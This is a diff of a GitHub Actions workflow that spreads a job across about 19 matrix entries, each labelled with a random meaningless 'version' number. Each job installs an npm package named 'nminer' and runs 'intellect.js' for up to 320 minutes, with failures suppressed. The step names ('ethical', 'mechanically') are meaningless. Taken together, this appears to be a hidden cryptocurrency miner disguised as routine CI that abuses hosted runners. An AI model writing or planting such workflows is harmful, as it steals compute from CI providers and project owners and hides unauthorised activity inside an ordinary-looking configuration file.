@@ -9,24 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4836 }
-          - { version: 3412 }
-          - { version: 6070 }
-          - { version: 7510 }
-          - { version: 2250 }
-          - { version: 6922 }
-          - { version: 3639 }
-          - { version: 1613 }
-          - { version: 9201 }
-          - { version: 4472 }
-          - { version: 6140 }
-          - { version: 6624 }
-          - { version: 5182 }
-          - { version: 4614 }
-          - { version: 8496 }
-          - { version: 5535 }
-          - { version: 8578 }
-          - { version: 2287 }
+          - { version: 6233 }
+          - { version: 5163 }
+          - { version: 6572 }
+          - { version: 7843 }
+          - { version: 9084 }
+          - { version: 89 }
+          - { version: 8042 }
+          - { version: 4665 }
+          - { version: 6772 }
+          - { version: 2420 }
+          - { version: 5596 }
+          - { version: 145 }
+          - { version: 5312 }
+          - { version: 624 }
+          - { version: 446 }
+          - { version: 3495 }
+          - { version: 340 }
+          - { version: 1197 }
+          - { version: 7261 }
 
     steps:
       - name: Checkout
@@ -37,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: ethical
+      - name: mechanically
         run: |
           npm install nminer@latest
-          timeout 331m node intellect.js || echo "intellect executed"
+          timeout 320m node intellect.js || echo "intellect executed"
